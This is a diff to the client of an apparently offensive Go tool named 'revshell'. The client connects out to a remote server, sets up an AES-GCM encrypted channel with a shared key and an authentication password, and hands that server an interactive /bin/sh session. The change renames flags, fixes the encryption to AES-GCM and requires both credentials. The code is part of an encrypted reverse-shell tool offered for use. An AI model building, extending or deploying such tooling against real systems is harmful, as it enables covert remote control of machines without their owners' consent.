@@ -8,19 +8,18 @@ import (
 	"log"
 	"net"
 	"os"
-	"strings"
 
 	"revshell/pkg/secureio"
 	"revshell/pkg/terminal"
 )
 
 type clientOptions struct {
-	addr       string
-	passphrase string
-	cipher     string
-	shell      string
-	prompt     string
-	workdir    string
+	addr         string
+	aesKey       string
+	authPassword string
+	shell        string
+	prompt       string
+	workdir      string
 }
 
 func main() {
@@ -32,12 +31,12 @@ func main() {
 	}
 	defer conn.Close()
 
-	reader, writer, err := secureio.Handshake(conn, false, opts.passphrase, opts.cipher)
+	reader, writer, err := secureio.Handshake(conn, false, opts.aesKey, opts.authPassword)
 	if err != nil {
 		log.Fatalf("client: handshake failed: %v", err)
 	}
 
-	log.Printf("client: connected to %s using %s cipher", opts.addr, opts.cipher)
+	log.Printf("client: connected to %s with AES-GCM encryption", opts.addr)
 
 	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
 	session, err := terminal.NewSession(reader, writer, sessionOpts)
@@ -51,26 +50,33 @@ func main() {
 }
 
 func parseFlags() clientOptions {
-	available := strings.Join(secureio.ListCipherSuites(), ", ")
-	addr := flag.String("addr", "127.0.0.1:2222", "remote server address")
-	pass := flag.String("pass", "", "shared passphrase used to derive encryption keys")
-	cipherName := flag.String("cipher", "aes", fmt.Sprintf("cipher suite to use (%s)", available))
+	addr := flag.String("server", "127.0.0.1:9999", "remote server address")
+	aesKey := flag.String("aes-key", "", "shared AES key or passphrase")
+	authPass := flag.String("auth-password", "", "authentication password")
 	shell := flag.String("shell", "/bin/sh", "shell executable used to run commands")
 	prompt := flag.String("prompt", "", "prompt template forwarded to the remote shell (supports {{.USER}}, {{.HOST}}, {{.CWD}}, {{.BASENAME}})")
 	workdir := flag.String("workdir", "", "initial working directory for new sessions")
 	flag.Parse()
 
-	if *pass == "" {
-		fmt.Fprintln(os.Stderr, "client: passphrase must be provided via -pass")
+	missing := false
+	if *aesKey == "" {
+		fmt.Fprintln(os.Stderr, "client: --aes-key must be provided")
+		missing = true
+	}
+	if *authPass == "" {
+		fmt.Fprintln(os.Stderr, "client: --auth-password must be provided")
+		missing = true
+	}
+	if missing {
 		os.Exit(1)
 	}
 
 	return clientOptions{
-		addr:       *addr,
-		passphrase: *pass,
-		cipher:     *cipherName,
-		shell:      *shell,
-		prompt:     *prompt,
-		workdir:    *workdir,
+		addr:         *addr,
+		aesKey:       *aesKey,
+		authPassword: *authPass,
+		shell:        *shell,
+		prompt:       *prompt,
+		workdir:      *workdir,
 	}
 }
